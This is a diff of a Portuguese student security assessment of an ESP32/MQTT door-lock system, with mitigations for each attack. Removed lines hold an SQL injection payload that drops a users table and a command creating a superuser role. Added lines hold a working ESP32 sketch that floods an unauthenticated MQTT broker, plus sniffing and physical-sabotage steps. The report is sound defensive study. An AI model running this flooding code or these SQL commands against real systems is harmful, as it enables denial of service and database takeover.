@@ -1,175 +1,183 @@
-# analise-vulnerabilidades
 
-## 1. Vulnerabilidades Identificadas no Banco de Dados
+# Analise de vunerabilidade 
 
-## 1.1. Análise Estática das Vulnerabilidades do Banco de Dados
+# 1. Análise do microsserviço
 
-### **V1 — Falta de validação/sanitização antes de escrever no banco**
-O microsserviço recebe JSON arbitrário do broker MQTT e grava no banco sem verificação rigorosa. Isso permite:
-- SQL Injection
-- Inserção de payload malicioso
-- Corrupção de logs
+## 1.1. Introdução
+Durante a análise do código MQTT utilizado no ESP32 e no servidor Node.js, foram identificadas as seguintes vulnerabilidades principais:
 
-### **V2 — Credenciais estáticas e risco de exposição**
-O captive portal não foi integrado; as credenciais são estáticas. Isso pode expor:
-- `service_role`
-- `anon_key`
-- `DATABASE_URL`
+### 1.1.1. Vunerabilidade 1 - falta de autenticação no broker:
 
-### **V3 — Privilégios excessivos no acesso ao banco**
-Se o microsserviço usa a role padrão do Supabase, ele possui permissões superiores ao necessário, aumentando impacto de um vazamento.
+O Mosquitto foi configurado sem nenhum sistema de autenticação para publicar ou receber mensagens. Isso significa que qualquer dispositivo na rede consegue se conectar ao broker sem precisar de usuário ou senha, o que abre várias brechas de segurança. 
+É possível destacar dois tipos de ataque que surgem diretamente dessa vulnerabilidade:
 
-### **V4 — Armazenamento de dados sensíveis altamente correlacionados**
-Tabelas como `users`, `cards`, `access_logs` e `service_groups` permitem reconstruir todo o comportamento dos usuários, o que pode aumentar o impacto de vazamento.
+### 1- Flooding:
+Sem autenticação, qualquer pessoa pode se conectar ao broker e começar a enviar uma quantidade absurda de mensagens. Esse “spam” trava o broker, derruba a rede e impede que as mensagens legítimas circulem.
 
-### **V5 — Possível ausência de TLS entre microsserviço e Supabase**
-Sem confirmação explícita do uso obrigatório de TLS, há risco de:
-- Interceptação de credenciais
-- MITM (Man-in-the-Middle)
-- Manipulação de requisições
+### 2- Spoofing:
+Como o broker não valida quem está se conectando, o atacante pode se passar por um dispositivo ou até pelo próprio serviço de validação. Dessa forma, ele envia respostas falsas fingindo ser o banco de dados, autorizando acessos indevidos ou bloqueando acessos reais.
 
-### **V6 — Réplica local SQLite sem criptografia**
-A réplica local não utiliza criptografia nativa, permitindo que um atacante acesse:
-- Logs
-- Usuários
-- Permissões
+### Ataque
+Para demonstrar o funcionamento e a simplicidade desse ataque, abaixo segue um código para a esp32 onde é simulado o Flooding:
 
-*Condição:* Se obtiver acesso ao sistema de arquivos.
+O primeiro e único passo é colocar o código abaixo para rodar na esp, ele vai conectar com o wifi, depois com o broker e assim vai ser possivel mandar mensagens.
 
----
+```cpp
 
-# 1.2. Ataques Identificados
+#include <WiFi.h>
+#include <PubSubClient.h>
 
-Dois ataques foram selecionados por impacto e plausibilidade dentro da arquitetura atual.
 
----
+const char* ssid = "iPhone de Nicholas";
+const char* password = "12345678";
 
-## 1.2.1. Ataque 1 — SQL Injection via MQTT
+// se o atacante descobrir o ip do broker e estiver no mesmo wifi o ataque é possivel
+const char* mqtt_server = "172.20.10.3"; // ou IP do seu broker
 
-**Título:** SQL Injection via payload MQTT → microsserviço → Supabase
+WiFiClient espClient;
+PubSubClient client(espClient);
 
-**Objetivo:** Executar comandos SQL arbitrários no banco Supabase.
+//define a mensagem que sera espamada
+const String mensagem = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
-### Passo-a-passo:
-1. Atacante descobre broker MQTT (mesma rede).
-2. Prepara payload malicioso:
-   ```json
-   {
-     "id_card": "1'); DROP TABLE users; --",
-     "id_lock": 2
-   }
-3. Publica em qualquer tópico (microsserviço assina #).
-4. Microsserviço concatena string maliciosa na query.
-5. Banco executa o comando injetado.
+//cria a função para enviar para o broker
+void enviarMQTT() {
+  client.publish("teste", mensagem.c_str());
 
-**Probabilidade:** Média-Alta Justificativa: O microsserviço não valida JSON antes de escrever no banco.
+}
 
-**Impacto:** Muito Alto Consequência: Destruição de tabelas críticas, interrupção do serviço, perda de auditoria.
 
-**Risco:** ALTO/CRÍTICO
+// funcao para conectar no wifi
+void setup_wifi() {
+  Serial.print("Conectando ao Wi-Fi...");
+  WiFi.begin(ssid, password);
+  while (WiFi.status() != WL_CONNECTED) {
+    delay(500);
+    Serial.print(".");
+  }
+  Serial.println("\nWi-Fi conectado!");
+}
 
-## 1.2.2. Ataque 2 — Comprometimento de Credenciais Supabase
+// funcao de conexão com o broker 
+void reconnect() {
+  while (!client.connected()) {
+    Serial.print("Conectando ao broker MQTT...");
+    if (client.connect("ESP32Teste")) { // esp32teste é o nome do dispositivo para o servidor mqtt
+      Serial.println("Conectado!");
+      client.subscribe("teste"); // inscreve no tópico "teste"
+    } else {
+      Serial.print("Falha, rc=");
+      Serial.print(client.state());
+      Serial.println(" tentando novamente em 5s...");
+      delay(5000);
+    }
+  }
+}
 
-**Título:** Takeover completo via vazamento de service_role
+void setup() {
+  Serial.begin(115200);
+  setup_wifi();
+  client.setServer(mqtt_server, 1883);
+}
 
-**Objetivo:** Obter controle total do banco remoto (Supabase).
-
-**Passo-a-passo:**
-1. Atacante acessa container, repositório ou máquina rodando o microsserviço.
-2. Extrai variáveis de ambiente (DATABASE_URL, service_role).
-3. Conecta diretamente ao banco via psql.
-4. Realiza dump de tabelas:
-
-```sql
-SELECT * FROM users;
-SELECT * FROM cards;
-SELECT * FROM access_logs;
-SELECT * FROM service_groups;
+void loop() {
+  if (!client.connected()) {
+    reconnect();
+  }
+//coloca a função de mensagem no loop, para ser enviada constantemente até a esp ser desligada
+  client.loop();
+  enviarMQTT();
+}
 ```
+<img src="video.mp4">
 
-5. Cria role atacante:
+### Mitigação:
+Uma forma de mitigar essa vulnerabilidade é implementar autenticação no broker. Isso inclui configurar um arquivo de password file no Mosquitto e exigir que todos os dispositivos, tanto o servidor quanto as ESP32, utilizem usuário e senha ao se conectar. Dessa forma, apenas dispositivos autorizados conseguem publicar ou receber mensagens, bloqueando imediatamente tentativas de flooding e impedindo que atacantes se passem por outros serviços.
 
-```sql
-CREATE ROLE atk WITH SUPERUSER LOGIN PASSWORD '1234';
-```
+1.1.2. Vunerabilidade 2 - Falta de TLS:
+O broker Mosquitto está configurado para aceitar conexões apenas pela porta 1883, que é a porta padrão sem criptografia. Isso significa que toda comunicação entre o ESP32 e o servidor via MQTT viaja pela rede em texto puro, sem nenhuma proteção.
 
-6. Manipula, apaga ou altera logs e permissões.
+Essa ausência de TLS (Transport Layer Security) traz dois problemas graves:
 
-**Probabilidade:** Alta Justificativa: Chaves service_role geralmente ficam expostas em ambientes acadêmicos com Docker.
+### 1 - Sniffing (captação de pacotes):
+Sem criptografia, qualquer pessoa conectada à mesma rede consegue capturar todo o tráfego MQTT usando ferramentas simples, como o wireshark, um interceptador de pacotes. O atacante consegue ver o conteúdo das mensagens publicadas, credenciais e comandos.
 
-**Impacto:** Crítico Consequência: Tomada completa do banco, exfiltração total, manipulação de dados, perda de integridade.
+### 2 - Manipulação de mensagens:
+Sem TLS, o cliente não tem como verificar se está falando com o broker real.
+O atacante pode interceptar o tráfego e alterar mensagens ou bloquear conteúdo importante.
 
-**Risco:** CRÍTICO
+### Ataque
+Para mostrar o funcionamento do sniffing é necessário apenas o wifi um interceptador de pacotes de rede, no caso dessa demostração está sendo usado wireshark. Abaixo segue o passo a passo:
 
----
+1- Abra o wireshark já conectado na internet.
 
-# 1.3. Matriz de Risco
+2- Clique em "adapter for loopback traffic capture"
+<img src="loopback.jpg">
 
-| Ataque                                              | Probabilidade | Impacto     | Risco         |
-|-----------------------------------------------------|--------------|-------------|---------------|
-| Comprometimento de Credenciais (Takeover Supabase) | Alta         | Altíssimo   | Crítico     |
-| SQL Injection via MQTT                              | Média-Alta   | Muito Alto  | Alto/Crítico |
+3- Na seção de filtro acima(em verde) coloque mqtt, para apenas capturar esse tipo de pacote.
+<img src="filtro.jpg">
+
+4- Espere os pacotes fluirem
+
+5- Procure por pacotes de publish Message
+
+6-clique duas vezes no pacote, abra a aba "MQ telemetry transport protocol, publish message"
+e vá em message
+
+<img src="message.jpg">
+
+7- Clique com botão direito na mensagem e copie-a como byte
+<img src="copyByte.jpg">
 
 
-# 1.4. Recomendações e Contramedidas
+Desse modo é so colar que a mensagem será mostrada.
 
-### Ações imediatas
-- Usar prepared statements (consultas parametrizadas).
-- Validar estrutura e tipos do JSON antes de inserir no banco de dados.
-- Reduzir privilégios da role usada pelo microsserviço (Princípio do Menor Privilégio).
-- Forçar uso de TLS com verificação de certificado.
-- Rotacionar chaves sensíveis (service_role, anon_key).
-- Evitar o uso de assinatura MQTT com curinga (#) quando não for estritamente necessário.
+#### mitigação:
 
-### Ações de médio prazo
-- Criptografar a réplica local SQLite (ex.: SQLCipher).
-- Habilitar auditoria do PostgreSQL (logs detalhados de consulta).
-- Implementar firewall de IP no Supabase para restringir acesso.
+A solução mais efetiva contra sniffing é criptografar todo o tráfego MQTT usando TLS.
+Isso transforma todas as mensagens em pacotes criptografados, impossíveis de serem interpretados mesmo se capturados.
 
-### Ações de longo prazo
-- Reintegrar um captive portal seguro para configuração de rede.
-- Implementar autenticação mútua (mTLS) entre ESP32 e o broker MQTT.
 
-# 3 Análise do hardware
+# 2 Análise do hardware
 
 Durante a análise do sistema de alimentação do dispositivo, foram identificadas as seguintes vulnerabilidades principais:
 
-## 3.1 Vulnerabilidade 1 - Alimentação de emergência por pilhas removíveis
+## 2.1 Vulnerabilidade 1 - Alimentação de emergência por pilhas removíveis
 
 O sistema utiliza pilhas como fonte de energia reserva, armazenadas em um compartimento facilmente acessível. Isso significa que qualquer pessoa com acesso físico ao dispositivo pode remover ou substituir essas pilhas sem que o sistema gere alertas ou registre a manipulação. Como a alimentação emergencial depende exclusivamente dessas pilhas, a remoção ou sabotagem delas pode comprometer completamente o funcionamento do dispositivo durante quedas de energia. Assim, são possíveis alguns casos de ataque, entre eles:
 
-### 3.1.1 Remoção física das pilhas
+### 2.1.1 Remoção física das pilhas
 
 Este ataque ocorre quando o indivíduo abre o compartimento e retira todas as pilhas. Após a remoção, o sistema continua funcionando normalmente enquanto a energia principal estiver disponível, o que mascara a sabotagem. Entretanto, no momento em que houver uma queda de energia, o dispositivo ficará totalmente desligado, comprometendo sua disponibilidade e afetando mecanismos dependentes dele.
 
 A probabilidade desse ataque é alta, pois exige apenas acesso físico e nenhum conhecimento técnico. O impacto é crítico, já que o sistema falha justamente quando a energia de reserva seria necessária. O risco resultante é, portanto, alto, combinando alta probabilidade e impacto elevado.
 
-### 3.1.2 Substituição por pilhas descarregadas ou defeituosas
+### 2.1.2 Substituição por pilhas descarregadas ou defeituosas
 
 Nesse ataque, o invasor abre o compartimento e substitui as pilhas corretas por unidades descarregadas, defeituosas ou com polaridade invertida. O dispositivo permanece funcionando normalmente enquanto estiver conectado à energia principal, ocultando a sabotagem. No momento em que ocorrer uma interrupção da energia externa, o sistema não terá autonomia e desligará instantaneamente.
 
 A probabilidade desse ataque é média-alta, pois exige que o atacante tenha pilhas inadequadas consigo, algo simples de obter. O impacto é alto, pois o sistema falha em um momento crítico e sem qualquer indicação prévia de problema. O risco final também é considerado alto, uma vez que combina impacto significativo com probabilidade relevante.
 
-### 3.1.3 Mitigação
+### 2.1.3 Mitigação
 
 A mitigação mais adequada consiste em substituir o uso de pilhas removíveis por uma bateria recarregável interna, integrada ao case e conectada diretamente ao sistema de alimentação principal. A bateria deve ser fixada de forma a impedir remoção manual, eliminando a possibilidade de manipulação sem desmontagem completa do case. Além disso, por ser recarregável, dispensa troca manual e reduz drasticamente o risco relacionado à sabotagem física do backup de energia.
 
-## 3.2 Vulnerabilidade 2 - Exposição dos fios entre os cases devido à instalação externa da tubulação
+## 2.2 Vulnerabilidade 2 - Exposição dos fios entre os cases devido à instalação externa da tubulação
 
 O sistema conta com dois cases interligados por fios que dependem de uma tubulação externa instalada no momento da implementação. Como essa tubulação não faz parte da estrutura original dos cases e depende da qualidade da instalação, ela pode apresentar fragilidades físicas, como baixa resistência a impacto ou fácil acesso quando colocada em áreas expostas. Com isso, um atacante pode quebrar a tubulação, removê-la ou cortá-la, obtendo acesso direto aos fios de comunicação e alimentação que conectam os módulos ESP utilizados no sistema aos componentes do case. A interrupção desses fios afeta diretamente o funcionamento integrado do dispositivo, podendo resultar em falhas totais ou parciais. Assim, são possíveis alguns casos de ataque, entre eles:
 
-### 3.2.1 Corte dos fios após ruptura da tubulação instalada
+### 2.2.1 Corte dos fios após ruptura da tubulação instalada
 
 Nesse ataque, o invasor identifica a tubulação externa que contém os fios, rompe sua estrutura e, com isso, expõe a fiação. A partir desse ponto, o atacante corta completamente os fios responsáveis pela interligação dos cases. Como esses fios são responsáveis pela comunicação dos componentes com as ESPs, o corte resulta na perda imediata da comunicação entre os módulos.
 
 A probabilidade desse ataque é média, pois depende de ferramentas simples para romper a tubulação, mas não exige conhecimento técnico. O impacto é alto, já que o corte interrompe diretamente o funcionamento do sistema, podendo causar desligamento, falha de comunicação ou indisponibilidade completa. O risco final é alto, resultante da combinação entre impacto elevado e probabilidade significativa devido à instalação exposta.
 
-### 3.2.2 Manipulação dos fios expostos após abertura da tubulação
+### 2.2.2 Manipulação dos fios expostos após abertura da tubulação
 
 No segundo ataque, o invasor não apenas rompe a tubulação, mas manipula os fios expostos sem necessariamente cortá-los. Isso inclui descascar parcialmente a fiação, inverter conexões, provocar curto-circuito ou interferir no sinal utilizado entre os cases. Como a tubulação é instalada externamente e pode variar conforme o ambiente, sua remoção parcial pode ser feita discretamente, permitindo manipulações que causam falhas intermitentes, mau funcionamento, reinicializações inesperadas ou até danos físicos aos módulos ESP.
 
 A probabilidade desse ataque é média-baixa, pois exige um pouco mais de intenção, tempo e conhecimento básico sobre fios e conexões. No entanto, o impacto permanece alto, já que a manipulação pode danificar os componentes, interromper o funcionamento ou gerar comportamentos imprevisíveis no sistema. O risco final é classificado como médio-alto, pois, embora a probabilidade seja moderada, o impacto operacional é severo.
 
-### 3.2.3 Mitigação
+### 2.2.3 Mitigação
 
 A mitigação deve envolver o reforço físico da tubulação externa instalada no case. Isso pode incluir o uso de eletrodutos metálicos rígidos ou tubulação reforçada resistente a impacto, além de fixação interna dos fios com presilhas internas que minimizem o movimento mesmo se a tubulação externa for danificada. Outra camada de proteção consiste em instalar um sensor de ruptura ou desconexão, que detecta alteração no estado dos fios ou abertura da tubulação, permitindo que o sistema registre ou sinalize tentativas de sabotagem.
